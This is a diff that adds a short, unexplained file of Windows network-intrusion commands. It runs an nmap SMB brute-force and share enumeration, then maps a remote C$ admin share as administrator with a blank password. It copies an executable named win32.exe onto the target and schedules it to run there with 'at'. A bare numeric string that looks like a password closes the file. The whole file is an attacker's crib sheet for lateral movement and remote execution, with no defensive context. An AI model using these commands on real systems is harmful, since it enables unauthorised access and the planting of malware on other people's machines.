@@ -1,0 +1,14 @@
+nmap -T 4 -v -A 172.16.1.112 --script smb-brute smb-enum-shares
+
+net use
+net use k: \\10.144.31.49\c$  "" /user:"administrator" 
+net use \\10.144.31.49\c$ /del
+net share f$=f:\
+net share f$ /del
+net view \\10.144.31.49
+
+net time \\10.144.31.49
+copy win32.exe k:\
+at \\10.144.31.49 c:\win32.exe
+
+12211987
